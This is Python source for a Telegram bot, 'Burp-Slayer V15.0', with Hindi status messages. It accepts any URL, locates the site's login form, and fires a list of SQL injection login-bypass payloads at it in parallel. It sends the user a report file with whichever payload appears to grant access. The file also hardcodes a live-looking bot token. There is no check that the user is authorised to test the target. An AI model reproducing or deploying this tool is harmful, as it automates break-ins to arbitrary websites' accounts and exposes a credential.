import telebot
import requests
from bs4 import BeautifulSoup
import time
import random
import urllib.parse
import os
from flask import Flask
from threading import Thread
from concurrent.futures import ThreadPoolExecutor

# Render Keep-Alive
app = Flask('')
@app.route('/')
def home(): return "Burp-Slayer V15.0 (Report Mode) is Online!"
def run(): app.run(host='0.0.0.0', port=10000)
def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

TOKEN = '8391067758:AAGE2NaejHoHVY7rpo6947n0WiTV2Hk41aY'
bot = telebot.TeleBot(TOKEN)

# SQL Library
SQL_LIBRARY = [
    "' or 1=1--", "admin' --", "admin' #", "' or 1=1 LIMIT 1--", 
    "admin' OR '1'='1'--", "') OR ('1'='1", "' OR SLEEP(5)--",
    "admin'/*", "' or ''='", "admin\" or 1=1--", "' OR 1=1#"
]

SUCCESS_KEYWORDS = ["logout", "log out", "signout", "dashboard", "admin panel", "welcome admin", "manage"]

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🎯 **Burp-Slayer V15.0 (Report & Verify Mode)**\n\nURL भेजें। सफलता मिलने पर मैं आपको एक **.txt रिपोर्ट** फाइल भेजूँगा।")

@bot.message_handler(func=lambda message: message.text.startswith('http'))
def attack_init(message):
    target_url = message.text
    chat_id = message.chat.id
    status_msg = bot.send_message(chat_id, "📡 एनालिसिस और फॉर्म डिटेक्शन शुरू...")

    session = requests.Session()
    try:
        res = session.get(target_url, timeout=12)
        soup = BeautifulSoup(res.text, 'html.parser')
        form = soup.find('form')
        
        if not form:
            bot.edit_message_text("❌ एरर: फॉर्म नहीं मिला।", chat_id, status_msg.message_id)
            return

        inputs = form.find_all('input')
        input_names = [i.get('name') for i in inputs if i.get('name')]
        user_key = next((n for n in input_names if any(x in n.lower() for x in ['user', 'login', 'id'])), input_names[0])
        pass_key = next((n for n in input_names if 'pass' in n.lower()), input_names[1] if len(input_names)>1 else 'password')

        bot.edit_message_text(f"🚀 **Verified Attack Started!**\nTarget: `{target_url}`", chat_id, status_msg.message_id)

        found_info = {"success": False}

        with ThreadPoolExecutor(max_workers=5) as executor:
            for p in SQL_LIBRARY:
                if found_info["success"]: break
                executor.submit(verification_engine, target_url, user_key, pass_key, p, chat_id, found_info)
                time.sleep(0.4)

    except Exception as e:
        bot.send_message(chat_id, f"⚠️ एरर: {str(e)}")

def verification_engine(url, u_key, p_key, p, chat_id, found_info):
    if found_info["success"]: return
    
    variants = [p, urllib.parse.quote(p)]
    for variant in variants:
        try:
            headers = {'User-Agent': f"Mozilla/5.0 (Security-Student-{random.random()})"}
            data = {u_key: variant, p_key: variant}
            r = requests.post(url, data=data, headers=headers, timeout=15, allow_redirects=True)
            
            response_content = r.text.lower()
            # पक्का सबूत चेक करना
            has_keyword = any(word in response_content for word in SUCCESS_KEYWORDS)
            
            if has_keyword:
                found_info["success"] = True
                
                # रिपोर्ट फाइल बनाना
                report_name = f"report_{chat_id}.txt"
                with open(report_name, "w") as f:
                    f.write(f"--- SQL INJECTION REPORT ---\n\n")
                    f.write(f"Target URL: {url}\n")
                    f.write(f"Successful Payload: {variant}\n")
                    f.write(f"Login Status: VERIFIED SUCCESS\n")
                    f.write(f"Final URL: {r.url}\n\n")
                    f.write(f"Note: Copy the payload above and use it in your browser.")
                
                # फाइल भेजना
                with open(report_name, "rb") as f:
                    bot.send_document(chat_id, f, caption="🏆 **REAL SUCCESS FOUND!**\n\nऊपर दी गई रिपोर्ट फाइल डाउनलोड करें। उसमें वर्किंग SQL पेलोड है।")
                
                os.remove(report_name) # फाइल डिलीट करना
                return
        except: pass

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
